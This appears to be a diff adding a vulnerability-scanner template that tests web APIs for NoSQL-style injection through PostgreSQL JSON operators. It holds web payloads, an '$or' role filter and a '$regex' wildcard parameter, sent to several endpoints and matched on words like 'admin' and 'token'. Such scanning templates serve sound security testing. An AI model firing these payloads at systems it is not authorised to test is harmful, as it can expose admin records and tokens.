@@ -1,0 +1,37 @@
+id: nosqli-postgres-json-inject
+info:
+  name: NoSQL-Style Injection in PostgreSQL JSON/JSONB Queries
+  author: AniipID
+  severity: high
+  description: Tests for injection through JSON operators in PostgreSQL when applications use JSON-based queries
+  tags: nosqli,postgres,json,injection
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/data"
+      - "{{BaseURL}}/api/query"
+    headers:
+      Content-Type: application/json
+    body: '{"$or": [{"role": "admin"}, {"role": "user"}]}'
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "token"
+          - "success"
+        condition: or
+        part: body
+
+  - method: GET
+    path:
+      - "{{BaseURL}}?filter={%22role%22:%22admin%22}"
+      - "{{BaseURL}}?q[$regex]=.*"
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "data"
+          - "result"
+        condition: or
+        part: body
